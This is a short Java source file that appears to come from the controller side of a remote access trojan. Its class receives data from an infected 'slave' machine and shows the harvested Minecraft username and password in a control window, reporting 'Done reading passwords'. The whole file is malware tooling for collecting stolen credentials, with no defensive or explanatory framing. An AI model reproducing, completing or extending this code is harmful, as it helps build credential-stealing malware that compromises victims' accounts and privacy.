package com.redpois0n.packets.in;

import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameMinecraft;

public class PacketMC extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String first = slave.readLine();
		String second = slave.readLine();

		FrameMinecraft frame = FrameMinecraft.instances.get(slave);

		if (frame != null) {
			if (first.equals("ERR")) {
				frame.setStatus(second, true);
			} else {
				frame.setUserPass(first, second);
				frame.setStatus("Done reading passwords", false);
			}
		}
	}

}
